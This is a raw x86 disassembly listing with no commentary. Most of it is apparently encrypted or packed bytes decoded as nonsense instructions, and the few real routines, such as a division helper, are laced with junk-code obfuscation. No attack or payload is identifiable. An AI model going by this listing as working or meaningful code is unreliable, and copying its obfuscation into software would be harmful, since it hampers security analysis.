  417e8c:	fist   DWORD PTR [edx]
  417e8e:	in     eax,0x65
  417e90:	xchg   ebp,eax
  417e91:	stos   DWORD PTR es:[edi],eax
  417e92:	jl     0x417e5f
  417e94:	hlt    
  417e95:	pop    ecx
  417e96:	js     0x417e9f
  417e98:	dec    ebp
  417e99:	xor    dl,dl
  417e9b:	cmc    
  417e9c:	std    
  417e9d:	not    cl
  417e9f:	test   bl,0xb3
  417ea2:	xchg   edx,eax
  417ea3:	lds    eax,FWORD PTR [esi+0x740a1f39]
  417ea9:	xor    al,0xf
  417eab:	popf   
  417eac:	into   
  417ead:	addr16 jae 0x417e99
  417eb0:	mov    esp,DWORD PTR [ebx]
  417eb2:	cmp    ah,BYTE PTR [ebx+0x1e99b20e]
  417eb8:	ins    BYTE PTR es:[edi],dx
  417eb9:	nop
  417eba:	loopne 0x417ef2
  417ebc:	inc    esp
  417ebd:	dec    esp
  417ebe:	push   edi
  417ebf:	add    cx,WORD PTR ds:0x2d0dcfe8
  417ec6:	inc    ecx
  417ec7:	inc    edx
  417ec8:	dec    ecx
  417ec9:	das    
  417eca:	jmp    0x39fc:0x7806d8b1
  417ed1:	fs cmp edx,edx
  417ed4:	(bad)  
  417ed5:	call   0xefc0387e
  417eda:	sti    
  417edb:	retf   
  417edc:	std    
  417edd:	inc    esi
  417ede:	cmp    eax,0x6b8efb35
  417ee3:	and    dl,BYTE PTR [ebx]
  417ee5:	mov    eax,0xe730a31b
  417eea:	loop   0x417f21
  417eec:	sar    BYTE PTR [edx],0x1f
  417eef:	and    esp,ebx
  417ef1:	les    ebp,FWORD PTR [esi]
  417ef3:	out    0xd1,eax
  417ef5:	pop    esi
  417ef6:	out    dx,al
  417ef7:	lea    edi,[edi+0x46]
  417efa:	cwde   
  417efb:	pop    ebx
  417efc:	mov    edx,0xb645d411
  417f01:	cmp    BYTE PTR [edx+0x6294f986],ah
  417f07:	sar    BYTE PTR [ebp-0x6f924f45],cl
  417f0d:	jns    0x417f87
  417f0f:	add    bh,BYTE PTR ds:0x32203907
  417f15:	mov    esi,0xc8d109d2
  417f1a:	mov    eax,ds:0x563f5cb2
  417f1f:	dec    edx
  417f20:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  417f21:	mov    edx,0xb06403f
  417f26:	push   0x96efedbc
  417f2b:	inc    esp
  417f2c:	sbb    eax,0xd5a3b2c
  417f31:	pop    ss
  417f32:	lea    edi,[edx]
  417f34:	pop    ecx
  417f35:	push   ebp
  417f36:	mov    ds:0x3378264f,eax
  417f3b:	push   eax
  417f3c:	ins    BYTE PTR es:[edi],dx
  417f3d:	pop    esi
  417f3e:	inc    ebp
  417f3f:	cdq    
  417f40:	xor    al,0xaf
  417f42:	add    eax,0x4a9e8d1c
  417f47:	xchg   BYTE PTR [esi*1-0x2262d524],ch
  417f4e:	cmp    bl,cl
  417f50:	(bad)  
  417f51:	mov    ah,0x56
  417f53:	push   esi
  417f54:	xor    dl,BYTE PTR [eax]
  417f56:	out    0x31,al
  417f58:	push   cs
  417f59:	(bad)  
  417f5b:	mov    fs,WORD PTR [eax]
  417f5d:	arpl   dx,si
  417f5f:	sub    eax,0x122692a2
  417f64:	je     0x417fb1
  417f66:	pop    ecx
  417f67:	mov    DWORD PTR ss:[ebx],ecx
  417f6a:	mov    WORD PTR [edi+eiz*1-0x13],gs
  417f6e:	pop    ebp
  417f6f:	dec    edi
  417f70:	sub    eax,0xbb5f459f
  417f75:	jo     0x417f4d
  417f77:	outs   dx,BYTE PTR ds:[esi]
  417f78:	pushf  
  417f79:	mov    al,0x1d
  417f7b:	out    dx,eax
  417f7c:	jmp    0x417faa
  417f7e:	lods   eax,DWORD PTR ds:[esi]
  417f7f:	hlt    
  417f80:	xor    edi,DWORD PTR [eax-0x36]
  417f83:	int    0xb7
  417f85:	inc    esp
  417f86:	ja     0x417fdc
  417f88:	push   edx
  417f89:	fimul  DWORD PTR [edx+0x2d]
  417f8c:	aas    
  417f8d:	push   cs
  417f8e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  417f8f:	dec    esi
  417f90:	jns    0x417f2f
  417f92:	pop    ds
  417f93:	shl    DWORD PTR [eax+0x26],0x92
  417f97:	inc    edx
  417f98:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  417f99:	mov    al,ds:0x699623d9
  417f9e:	inc    esi
  417f9f:	xchg   edi,eax
  417fa0:	push   eax
  417fa1:	mov    dl,0x8f
  417fa3:	and    al,0x6
  417fa5:	fimul  DWORD PTR [edi-0xe50c231]
  417fab:	jecxz  0x417fa8
  417fad:	shl    dl,0x78
  417fb0:	test   BYTE PTR [ebp+0x71],bh
  417fb3:	in     al,0x4f
  417fb5:	rcr    edx,cl
  417fb7:	test   BYTE PTR [edx],bl
  417fb9:	or     cl,BYTE PTR [ebp-0x55b7fbc7]
  417fbf:	popf   
  417fc0:	jmp    0x8231:0xa79be55f
  417fc7:	dec    edi
  417fc8:	adc    al,0x2f
  417fca:	add    BYTE PTR [eax-0x445426a5],ah
  417fd0:	xchg   esi,eax
  417fd1:	sub    al,0x77
  417fd3:	dec    ebx
  417fd4:	xor    ebp,esp
  417fd6:	bound  ebp,QWORD PTR [eax+0x77c941e6]
  417fdc:	stc    
  417fdd:	pop    edi
  417fde:	adc    al,0x1e
  417fe0:	fcomi  st,st(0)
  417fe2:	xchg   esp,eax
  417fe3:	and    edx,ecx
  417fe5:	les    edi,FWORD PTR [eax+ebx*4+0x32e99121]
  417fec:	loopne 0x417f9a
  417fee:	jno    0x418034
  417ff0:	dec    edx
  417ff1:	add    ch,BYTE PTR [ebx-0x6cd21e15]
  417ff7:	test   dl,0x32
  417ffa:	shl    DWORD PTR [eax-0x2],0x72
  417ffe:	pop    ebp
  417fff:	adc    esi,esp
  418001:	sub    eax,0xabb1c6cd
  418006:	cli    
  418007:	or     eax,0xd0df38b8
  41800c:	pop    esp
  41800d:	mov    dl,0xed
  41800f:	ins    BYTE PTR es:[edi],dx
  418010:	pop    ecx
  418011:	sti    
  418012:	cs mov bh,0xc2
  418015:	or     al,0x74
  418017:	adc    eax,0x624b3ed0
  41801c:	or     al,0xb6
  41801e:	push   edi
  41801f:	mov    ?,edx
  418021:	loop   0x417fbe
  418023:	pop    ecx
  418024:	jno    0x418015
  418026:	sti    
  418027:	rol    DWORD PTR [ebx+0x2e],cl
  41802a:	pop    eax
  41802b:	sar    BYTE PTR [edx+0x11],0xdb
  41802f:	pop    eax
  418030:	shl    DWORD PTR [edi-0x7b],1
  418033:	inc    edx
  418034:	fcomp  QWORD PTR [edi-0x20]
  418037:	jns    0x41807e
  418039:	xlat   BYTE PTR ds:[ebx]
  41803a:	jmp    0x2cc3ff83
  41803f:	xor    al,0x58
  418041:	sub    al,BYTE PTR fs:[eax+0x61]
  418045:	pop    eax
  418046:	stc    
  418047:	out    0x31,eax
  418049:	cmp    DWORD PTR [edi],esi
  41804b:	lahf   
  41804c:	xchg   ecx,eax
  41804d:	aam    0xb3
  41804f:	sub    bh,BYTE PTR [edi]
  418051:	cmp    eax,0xa4b03e1d
  418056:	mov    bl,0x13
  418058:	cmp    BYTE PTR [ebx+0x6ab94dcd],bh
  41805e:	add    DWORD PTR [ebx],eax
  418060:	(bad)  
  418061:	push   eax
  418062:	lea    eax,[ebp-0x13]
  418065:	push   eax
  418066:	shl    ecx,0x1e
  418069:	call   0x41182a
  41806e:	mov    eax,DWORD PTR [ebp+0x10]
  418071:	mov    ecx,DWORD PTR [ebp+0x14]
  418074:	shrd   eax,ecx,0x2
  418078:	shr    ecx,0x2
  41807b:	mov    ecx,DWORD PTR [ebp+0x10]
  41807e:	mov    edx,DWORD PTR [ebp+0x14]
  418081:	xor    eax,esi
  418083:	xor    edx,edx
  418085:	or     eax,edx
  418087:	add    eax,edi
  418089:	push   0x1
  41808b:	push   eax
  41808c:	mov    eax,DWORD PTR [ebp+0x8]
  41808f:	shl    ecx,0x1e
  418092:	mov    ecx,DWORD PTR [ebp+0xc]
  418095:	shrd   eax,ecx,0x2
  418099:	shr    ecx,0x2
  41809c:	mov    ecx,DWORD PTR [ebp+0x8]
  41809f:	mov    edx,DWORD PTR [ebp+0xc]
  4180a2:	xor    eax,esi
  4180a4:	xor    edx,edx
  4180a6:	or     eax,edx
  4180a8:	add    eax,edi
  4180aa:	push   eax
  4180ab:	shl    ecx,0x1e
  4180ae:	call   0x41182a
  4180b3:	push   0x1
  4180b5:	lea    eax,[ebp-0x13]
  4180b8:	push   eax
  4180b9:	mov    eax,DWORD PTR [ebp+0x10]
  4180bc:	mov    ecx,DWORD PTR [ebp+0x14]
  4180bf:	shrd   eax,ecx,0x2
  4180c3:	shr    ecx,0x2
  4180c6:	mov    ecx,DWORD PTR [ebp+0x10]
  4180c9:	mov    edx,DWORD PTR [ebp+0x14]
  4180cc:	xor    eax,esi
  4180ce:	xor    edx,edx
  4180d0:	or     eax,edx
  4180d2:	add    eax,edi
  4180d4:	push   eax
  4180d5:	shl    ecx,0x1e
  4180d8:	call   0x41182a
  4180dd:	mov    eax,DWORD PTR [ebp+0x10]
  4180e0:	mov    ecx,DWORD PTR [ebp+0x14]
  4180e3:	shrd   eax,ecx,0x2
  4180e7:	shr    ecx,0x2
  4180ea:	mov    ecx,DWORD PTR [ebp+0x10]
  4180ed:	mov    edx,DWORD PTR [ebp+0x14]
  4180f0:	pop    edi
  4180f1:	xor    eax,esi
  4180f3:	xor    edx,edx
  4180f5:	pop    esi
  4180f6:	shl    ecx,0x1e
  4180f9:	or     eax,edx
  4180fb:	pop    ebx
  4180fc:	leave  
  4180fd:	ret    0x10
  418100:	not    eax
  418102:	push   ebx
  418103:	push   esi
  418104:	sub    DWORD PTR ds:0x42827d,ebx
  41810a:	mov    eax,DWORD PTR [esp+0x18]
  41810e:	or     DWORD PTR ds:0x42821d,0x4f4
  418118:	or     eax,eax
  41811a:	jne    0x4184a9
  418120:	adc    eax,ecx
  418122:	jmp    0x418475
  418127:	enter  0x7a3e,0xcf
  41812b:	lea    ecx,[esi]
  41812d:	popf   
  41812e:	pop    ebp
  41812f:	cmc    
  418130:	sbb    BYTE PTR [edi+0x53c07cfb],0x45
  418137:	sbb    al,0xc
  418139:	sar    DWORD PTR [ebx-0x44443ae2],0x61
  418140:	stc    
  418141:	and    dl,BYTE PTR [ecx]
  418143:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418144:	pop    ebx
  418145:	imul   ebp,edi,0x7c11ffaf
  41814b:	mov    edx,0x4f0c94a4
  418150:	retf   0x7752
  418153:	xchg   esi,eax
  418154:	xor    dh,BYTE PTR [edx-0xc]
  418157:	cld    
  418158:	idiv   edx
  41815a:	fcmovbe st,st(5)
  41815c:	inc    edx
  41815d:	stc    
  41815e:	sbb    al,0xfe
  418160:	adc    al,0x50
  418162:	lods   al,BYTE PTR ds:[esi]
  418163:	dec    edi
  418164:	pop    ds
  418165:	std    
  418166:	les    ebx,FWORD PTR [ebx+0x4e49bdd9]
  41816c:	ds push eax
  41816e:	jl     0x4181cb
  418170:	mov    dh,0xda
  418172:	sbb    dh,al
  418174:	pop    ds
  418175:	add    al,0xc7
  418177:	scas   al,BYTE PTR es:[edi]
  418178:	adc    eax,0xea258271
  41817d:	(bad)  
  41817f:	(bad)  
  418180:	fisttp DWORD PTR [ebx-0x4cd57ec5]
  418186:	add    al,0x60
  418188:	mov    BYTE PTR [esi+0x74904179],cl
  41818e:	aad    0x92
  418190:	mov    eax,0xc200fca2
  418195:	xor    DWORD PTR ds:[eax+0x58],esi
  418199:	stos   DWORD PTR es:[edi],eax
  41819a:	and    dl,BYTE PTR [edx]
  41819c:	sti    
  41819d:	jle    0x4181a4
  41819f:	in     al,0x4b
  4181a1:	test   ah,cl
  4181a3:	sahf   
  4181a4:	sub    DWORD PTR [ebx-0x77],ecx
  4181a7:	jmp    0x1453:0x8f646532
  4181ae:	push   0xffffffbc
  4181b0:	shl    BYTE PTR [esi-0x278f6a26],cl
  4181b6:	fisubr WORD PTR [edx]
  4181b8:	jp     0x4181e7
  4181ba:	cli    
  4181bb:	ss xor eax,0x76d8be66
  4181c1:	push   0xfffffffb
  4181c3:	mov    edi,0xf2a18ebe
  4181c8:	ins    BYTE PTR es:[edi],dx
  4181c9:	jne    0x418192
  4181cb:	cwde   
  4181cc:	(bad)  
  4181cd:	mov    ebp,0xebbaa5bc
  4181d2:	and    eax,0x476b8fa5
  4181d7:	daa    
  4181d8:	xchg   BYTE PTR [edi-0x42],bh
  4181db:	(bad)  
  4181dc:	push   ebx
  4181dd:	ss adc al,0x64
  4181e0:	or     edi,ecx
  4181e2:	cdq    
  4181e3:	gs inc ebp
  4181e5:	xor    ch,BYTE PTR [esi+0x6c3fc012]
  4181eb:	fnsave [edx+edi*2+0x3c685c63]
  4181f2:	mov    al,ds:0xe95aa801
  4181f7:	add    al,0xa4
  4181f9:	sub    DWORD PTR [eax-0x58d05e3e],ecx
  4181ff:	pop    eax
  418200:	jecxz  0x418187
  418202:	mov    edx,0xeb6dfaa7
  418207:	pop    ss
  418208:	push   edi
  418209:	lods   al,BYTE PTR ds:[esi]
  41820a:	jg     0x4181fc
  41820c:	push   eax
  41820d:	sub    DWORD PTR [edx+0x26],edi
  418210:	sbb    ecx,DWORD PTR [ebx+0x3ff41afd]
  418216:	cdq    
  418217:	leave  
  418218:	jp     0x418263
  41821a:	pusha  
  41821b:	inc    esi
  41821c:	sub    eax,0x5f56029e
  418221:	mov    al,0x2
  418223:	pop    edx
  418224:	bound  eax,QWORD PTR [eax+0x12]
  418227:	xchg   esi,eax
  418228:	sub    bh,BYTE PTR [ecx+0xc]
  41822b:	fnstenv [ebp+0x48]
  41822e:	ins    DWORD PTR es:[edi],dx
  41822f:	fnstsw WORD PTR [edx]
  418231:	mov    eax,0x1e3e7162
  418236:	xor    eax,0x81519dc1
  41823c:	push   edi
  41823d:	mov    al,0x19
  41823f:	retf   0xb6d7
  418242:	and    cl,ch
  418244:	jnp    0x4181cb
  418246:	adc    ah,cl
  418248:	out    dx,eax
  418249:	mov    ebp,0x61d36fb9
  41824e:	xor    al,0xfb
  418250:	test   DWORD PTR [ecx-0x66],ebp
  418253:	push   ecx
  418254:	sub    DWORD PTR [edi-0x16],0xffffff89
  418258:	mov    eax,0xd26e2884
  41825d:	jmp    0xe313114e
  418262:	scas   al,BYTE PTR es:[edi]
  418263:	int    0x13
  418265:	jns    0x41828a
  418267:	push   esi
  418268:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418269:	jecxz  0x41828a
  41826b:	cmp    BYTE PTR [ebx-0x2],al
  41826e:	push   ebp
  41826f:	ret    0x1ca9
  418272:	inc    ecx
  418273:	xor    DWORD PTR [ecx+0x6772fe21],ebp
  418279:	cmp    BYTE PTR [ecx+0x4b],0x39
  41827d:	mov    dh,0xb
  41827f:	cmp    esi,DWORD PTR [ebx+0x52]
  418282:	push   ds
  418283:	mov    ecx,0x7c2572bd
  418288:	jle    0x4182bf
  41828a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41828b:	mov    dl,0xef
  41828d:	pop    eax
  41828e:	sub    BYTE PTR [esi-0x65],0x5e
  418292:	into   
  418293:	es mov esi,0x329831a4
  418299:	dec    eax
  41829a:	mov    ch,0xab
  41829c:	loopne 0x418247
  41829e:	les    ebx,FWORD PTR [ebp+0x766115fe]
  4182a4:	loopne 0x418276
  4182a6:	rcl    DWORD PTR [edx-0x57],1
  4182a9:	loope  0x4182d3
  4182ab:	xchg   edx,eax
  4182ac:	das    
  4182ad:	leave  
  4182ae:	jnp    0x418287
  4182b0:	mov    al,ds:0xbb52081
  4182b5:	sbb    edx,DWORD PTR [ebx]
  4182b7:	inc    ecx
  4182b8:	mov    DWORD PTR [edi+ecx*8],eax
  4182bb:	lods   al,BYTE PTR ds:[si]
  4182bd:	jge    0x418286
  4182bf:	mov    cl,0x5f
  4182c1:	adc    al,0xb8
  4182c3:	or     DWORD PTR [ebp+0x42],0x24
  4182c7:	push   esi
  4182c8:	push   esi
  4182c9:	aam    0xb8
  4182cb:	cmp    al,0xb3
  4182cd:	call   0x7ff9e78
  4182d2:	xchg   edx,eax
  4182d3:	xchg   esp,eax
  4182d4:	gs xchg ebx,eax
  4182d6:	in     al,dx
  4182d7:	gs je  0x4182d9
  4182da:	push   0x56
  4182dc:	lods   eax,DWORD PTR ds:[esi]
  4182dd:	dec    eax
  4182de:	fsub   st(5),st
  4182e0:	pop    ecx
  4182e1:	loop   0x418284
  4182e3:	sbb    eax,0xdb4ead9c
  4182e8:	(bad)  
  4182ea:	push   ebx
  4182eb:	fwait
  4182ec:	cmp    BYTE PTR ds:0x3d3c5253,dh
  4182f2:	mov    ah,0x42
  4182f4:	(bad)  
  4182f6:	pop    edx
  4182f7:	ficomp DWORD PTR [edi-0x43]
  4182fa:	test   al,0x34
  4182fc:	adc    eax,0x23b77ba6
  418301:	fs jne 0x418298
  418304:	shr    BYTE PTR [esi+0x2],cl
  418307:	fs js  0x418370
  41830a:	mov    edx,ss
  41830c:	pushf  
  41830d:	repnz and eax,0x168f55bb
  418313:	cmp    dl,BYTE PTR [ebp+0x5d15804d]
  418319:	mov    gs,WORD PTR [ebp+0x34a395d3]
  41831f:	pop    ecx
  418320:	mov    ecx,DWORD PTR [ebx]
  418322:	pop    esi
  418323:	mov    al,0x20
  418325:	push   ss
  418326:	out    dx,eax
  418327:	ins    DWORD PTR es:[edi],dx
  418328:	scas   eax,DWORD PTR es:[edi]
  418329:	test   DWORD PTR [ecx],esi
  41832b:	test   cl,bl
  41832d:	pop    edx
  41832e:	sbb    al,0xea
  418330:	call   0x2989:0xbf5c99c0
  418337:	jge    0x4183a8
  418339:	shl    BYTE PTR [edi+edx*8],0xc0
  41833d:	neg    edi
  41833f:	inc    ecx
  418340:	dec    edi
  418341:	sub    eax,0x825587d
  418346:	gs (bad) 
  418348:	fs jmp 0x4183a7
  41834b:	push   edx
  41834c:	push   cs
  41834d:	mov    esi,0xd94a46c2
  418352:	fcomp  QWORD PTR [ebx+0x2e]
  418355:	popa   
  418356:	inc    eax
  418357:	inc    edx
  418358:	inc    ecx
  418359:	sahf   
  41835a:	(bad)  
  41835b:	pop    edx
  41835c:	dec    edx
  41835d:	icebp  
  41835e:	add    eax,0xc4a4836e
  418363:	nop
  418364:	test   eax,0x67cfecd6
  418369:	mov    ah,dh
  41836b:	in     eax,0xe7
  41836d:	jg     0x4183be
  41836f:	sub    al,0xf2
  418371:	inc    ebx
  418372:	inc    edx
  418373:	jecxz  0x41839b
  418375:	or     eax,0xf7c34f1c
  41837a:	pop    ecx
  41837b:	sahf   
  41837c:	sbb    al,0xf7
  41837e:	call   0x83578548
  418383:	jmp    0x4d7d0cde
  418388:	sti    
  418389:	shl    DWORD PTR [ecx],1
  41838b:	sub    dl,bl
  41838d:	add    BYTE PTR [edi],0x1a
  418390:	(bad)  
  418391:	or     cl,dl
  418393:	sbb    DWORD PTR [edi-0xdba5455],ecx
  418399:	mov    ebx,0x6ca5edde
  41839e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41839f:	mov    ecx,0x1127b463
  4183a4:	add    eax,0xd7b5eb05
  4183a9:	pop    es
  4183aa:	xchg   esp,eax
  4183ab:	dec    eax
  4183ac:	into   
  4183ad:	sbb    esi,DWORD PTR [ecx]
  4183af:	cs inc eax
  4183b1:	jne    0x41840e
  4183b3:	jmp    0x59b4:0xa6eb41de
  4183ba:	leave  
  4183bb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4183bc:	mov    esi,0xcf023fc6
  4183c1:	test   eax,0x33ccb3d8
  4183c6:	test   DWORD PTR [esi+0x6fb3ed0a],0xb7c99094
  4183d0:	sub    ecx,DWORD PTR [edi-0x4f]
  4183d3:	pop    ecx
  4183d4:	xchg   edx,eax
  4183d5:	ins    BYTE PTR es:[edi],dx
  4183d6:	push   ds
  4183d7:	mov    esi,0x25b58ef2
  4183dc:	aam    0x5
  4183de:	(bad)  
  4183df:	cld    
  4183e0:	popa   
  4183e1:	ins    DWORD PTR es:[edi],dx
  4183e2:	stos   DWORD PTR es:[edi],eax
  4183e3:	dec    esp
  4183e4:	jns    0x4183d1
  4183e6:	mov    cs,WORD PTR [ecx+esi*1-0x42ca73c]
  4183ed:	loop   0x4183a4
  4183ef:	push   es
  4183f0:	dec    ebx
  4183f1:	and    dh,ch
  4183f3:	or     al,BYTE PTR [eax+0x7f047ac1]
  4183f9:	call   0x74c8224a
  4183fe:	xor    al,0x59
  418400:	xchg   esi,eax
  418401:	iret   
  418402:	jecxz  0x4183cc
  418404:	mov    eax,ds:0x39e916ab
  418409:	fst    st(7)
  41840b:	mov    dh,0xb3
  41840d:	push   es
  41840e:	cmp    edi,DWORD PTR [eax+0x67bcbf00]
  418414:	dec    edx
  418415:	rcr    ecx,cl
  418417:	ror    BYTE PTR [eax+edx*8-0x6d],1
  41841b:	add    DWORD PTR [edx+0x78],edx
  41841e:	and    ah,BYTE PTR [ecx]
  418420:	sysexit 
  418422:	mov    al,0xc7
  418424:	in     al,dx
  418425:	mov    ebx,0x7adaac13
  41842a:	jmp    0xe19b:0x43800416
  418431:	loope  0x418427
  418433:	cli    
  418434:	mov    al,0x7b
  418436:	sbb    eax,0xf2bf230e
  41843b:	dec    ebx
  41843c:	push   ebp
  41843d:	and    al,0xa3
  41843f:	aas    
  418440:	jp     0x4184b6
  418442:	xchg   ebp,eax
  418443:	pop    edi
  418444:	das    
  418445:	cmp    bl,0x54
  418448:	adc    eax,0x5e5a27b
  41844d:	test   BYTE PTR [edi+0x560d610d],ah
  418453:	fisubr DWORD PTR ss:[ebx+0x21]
  418457:	sub    bh,BYTE PTR [ebx+0x3488de7c]
  41845d:	push   edi
  41845e:	nop
  41845f:	test   DWORD PTR [edx],0x7ff13217
  418465:	mov    al,ds:0xc0876c6b
  41846a:	mov    eax,0x11b5daab
  41846f:	ret    
  418470:	xor    eax,0x680dc3d8
  418475:	mov    ecx,DWORD PTR [esp+0x14]
  418479:	mov    eax,DWORD PTR [esp+0x10]
  41847d:	xor    edx,edx
  41847f:	and    ebx,0x4418
  418485:	div    ecx
  418487:	mov    ebx,eax
  418489:	and    eax,DWORD PTR ds:0x428219
  41848f:	mov    eax,DWORD PTR [esp+0xc]
  418493:	not    DWORD PTR ds:0x4281b1
  418499:	div    ecx
  41849b:	push   DWORD PTR ds:0x428209
  4184a1:	pop    edx
  4184a2:	mov    edx,ebx
  4184a4:	jmp    0x4188eb
  4184a9:	mov    ebx,DWORD PTR ds:0x428249
  4184af:	mov    edx,DWORD PTR ds:0x4282d9
  4184b5:	sub    ebx,edx
  4184b7:	sub    ebx,DWORD PTR [ebx+edx*1]
  4184ba:	mov    ecx,eax
  4184bc:	mov    ebx,DWORD PTR [esp+0x14]
  4184c0:	cmp    DWORD PTR ds:0x428285,0x0
  4184c7:	mov    DWORD PTR ds:0x42819d,0x6017
  4184d1:	mov    edx,DWORD PTR ds:0x428209
  4184d7:	mov    DWORD PTR ds:0x428209,ecx
  4184dd:	not    edx
  4184df:	jmp    0x418549
  4184e4:	mov    DWORD PTR ds:0x428269,0x417
  4184ee:	cmp    DWORD PTR ds:0x428285,0x0
  4184f5:	ja     0x418531
  4184fb:	push   0x5fbc
  418500:	push   0x77f6
  418505:	push   DWORD PTR [ebp-0x28]
  418508:	push   0x18af
  41850d:	call   DWORD PTR ds:0x428a80
  418513:	sbb    edx,DWORD PTR ds:0x4282c1
  418519:	add    edx,0x6710
  41851f:	xor    DWORD PTR ds:0x428235,edx
  418525:	mov    edx,DWORD PTR ds:0x42821d
  41852b:	sub    DWORD PTR ds:0x428201,edx
  418531:	or     DWORD PTR ds:0x428269,0x5599
  41853b:	sbb    DWORD PTR ds:0x4282c5,ecx
  418541:	adc    edx,edx
  418543:	sbb    DWORD PTR ds:0x428201,ecx
  418549:	mov    edx,DWORD PTR [esp+0x10]
  41854d:	mov    eax,DWORD PTR [esp+0xc]
  418551:	shr    ecx,1
  418553:	rcr    ebx,1
  418555:	shr    edx,1
  418557:	rcr    eax,1
  418559:	or     ecx,ecx
  41855b:	jne    0x418551
  418561:	div    ebx
  418563:	mov    esi,eax
  418565:	mul    DWORD PTR [esp+0x18]
  418569:	mov    ecx,eax
  41856b:	mov    eax,DWORD PTR [esp+0x14]
  41856f:	jmp    0x4188c2
  418574:	in     eax,0x11
  418576:	lahf   
  418577:	shr    DWORD PTR [edi+0x5b35b574],1
  41857d:	sub    al,0xec
  41857f:	outs   dx,DWORD PTR ds:[esi]
  418580:	jle    0x4185ea
  418582:	rdtsc  
  418584:	or     BYTE PTR [esi],0xc1
  418587:	mov    ebx,0xbbbbc51e
  41858c:	add    bl,BYTE PTR [ecx+0x1d]
  41858f:	cmp    dl,BYTE PTR [ecx+0x5f]
  418592:	cmp    eax,eax
  418594:	inc    esi
  418595:	leave  
  418596:	add    al,0xd9
  418598:	and    DWORD PTR [esi+0xc],ebx
  41859b:	cmp    edi,ebx
  41859d:	cld    
  41859e:	test   DWORD PTR [eax-0x20],ecx
  4185a1:	pop    eax
  4185a2:	cmp    al,0x15
  4185a4:	sbb    BYTE PTR ds:0x9dc0a8a0,bl
  4185aa:	and    DWORD PTR [eax],edi
  4185ac:	fs call 0x51a9:0x104533e
  4185b4:	xor    bl,BYTE PTR [ecx]
  4185b6:	into   
  4185b7:	sub    BYTE PTR [eax-0x3f97576],dl
  4185bd:	adc    eax,0xcbc795b9
  4185c2:	sub    al,0xed
  4185c4:	xchg   edi,eax
  4185c5:	mov    dh,0x65
  4185c7:	adc    ah,BYTE PTR [ecx-0x2c]
  4185ca:	enter  0xa671,0x5d
  4185ce:	xchg   BYTE PTR [ebx+0x2c],bh
  4185d1:	mov    cl,0xe
  4185d3:	outs   dx,BYTE PTR ds:[esi]
  4185d4:	xchg   edx,eax
  4185d5:	inc    ebx
  4185d6:	ror    dh,cl
  4185d8:	jl     0x4185ff
  4185da:	sbb    al,BYTE PTR [ecx]
  4185dc:	pusha  
  4185dd:	test   DWORD PTR [edx+0x25],esi
  4185e0:	sti    
  4185e1:	lods   eax,DWORD PTR ds:[esi]
  4185e2:	xor    DWORD PTR [eax],0x76
  4185e5:	nop
  4185e6:	ins    BYTE PTR es:[edi],dx
  4185e7:	mov    bl,0x44
  4185e9:	ror    ch,1
  4185eb:	inc    ebx
  4185ec:	retf   
  4185ed:	lea    ebx,[ebx+0x31096dd9]
  4185f3:	jno    0x4185f2
  4185f5:	mov    BYTE PTR [ebx-0x19f6547f],al
  4185fb:	int    0xa8
  4185fd:	sub    al,0x2a
  4185ff:	pop    ebx
  418600:	and    esp,DWORD PTR [bp-0x6b29]
  418605:	in     al,dx
  418606:	adc    ecx,edi
  418608:	aam    0x6c
  41860a:	xchg   edi,eax
  41860b:	and    esp,eax
  41860d:	mov    eax,0x84611add
  418612:	cmp    DWORD PTR [edi],ebp
  418614:	xor    dl,BYTE PTR [ebp-0x4b0b582f]
  41861a:	and    dl,al
  41861c:	stos   BYTE PTR es:[edi],al
  41861d:	(bad)  
  41861e:	and    BYTE PTR ds:0x360e9796,ch
  418624:	jmp    0x418606
  418626:	sbb    BYTE PTR [eax-0x55],bl
  418629:	push   ecx
  41862a:	inc    eax
  41862b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41862c:	push   es
  41862d:	dec    eax
  41862e:	cmc    
  41862f:	lea    edx,[edi]
  418631:	stos   DWORD PTR es:[edi],eax
  418632:	and    DWORD PTR [ecx+0x42],esi
  418635:	add    edi,ecx
  418637:	add    cl,ch
  418639:	sub    BYTE PTR [ecx-0x2cd39470],ch
  41863f:	jae    0x4185c9
  418641:	aaa    
  418642:	jecxz  0x41861f
  418644:	and    al,0xc2
  418646:	retf   
  418647:	mov    edx,0xb381aab5
  41864c:	jge    0x4185f6
  41864e:	mov    cl,BYTE PTR [ebx-0x58]
  418651:	pop    ss
  418652:	jge    0x418616
  418654:	addr16 push ebp
  418656:	sbb    al,0x6
  418658:	cmc    
  418659:	pop    eax
  41865a:	pop    edi
  41865b:	fidiv  DWORD PTR [esi]
  41865d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41865e:	and    esi,DWORD PTR [esi+0x1c]
  418661:	addr16 xchg edx,eax
  418663:	popa   
  418664:	mov    eax,0x702c74b8
  418669:	and    bl,ch
  41866b:	mov    edx,0x355eacfb
  418670:	jg     0x4186c2
  418672:	call   0x6cff:0x811b6eec
  418679:	xor    al,0x14
  41867b:	push   esp
  41867c:	in     al,0x85
  41867e:	and    al,0x6b
  418680:	imul   ebp,DWORD PTR [edx-0x2e186717],0x23cf565a
  41868a:	cmp    dl,BYTE PTR [edx-0x684b3952]
  418690:	push   ds
  418691:	pop    ebx
  418692:	mov    ah,ch
  418694:	mov    edx,0x5d8fc3ce
  418699:	xchg   esi,eax
  41869a:	jno    0x4186bc
  41869c:	sbb    eax,0x77ba50f4
  4186a1:	push   ebp
  4186a2:	unpckhps xmm6,xmm3
  4186a5:	dec    eax
  4186a6:	sub    al,0x24
  4186a8:	jns    0x418663
  4186aa:	or     DWORD PTR [ebx+0x21],0x37ae10ac
  4186b1:	sahf   
  4186b2:	out    dx,eax
  4186b3:	push   es
  4186b4:	or     BYTE PTR [edi],dh
  4186b6:	pop    ebx
  4186b7:	adc    esi,DWORD PTR [ecx-0x4e]
  4186ba:	cli    
  4186bb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4186bc:	pop    eax
  4186bd:	xlat   BYTE PTR ds:[ebx]
  4186be:	jle    0x4186d3
  4186c0:	sub    ah,BYTE PTR [edi+0x3d]
  4186c3:	rol    BYTE PTR [ebp-0x57073e0],0x18
  4186ca:	loope  0x4186bd
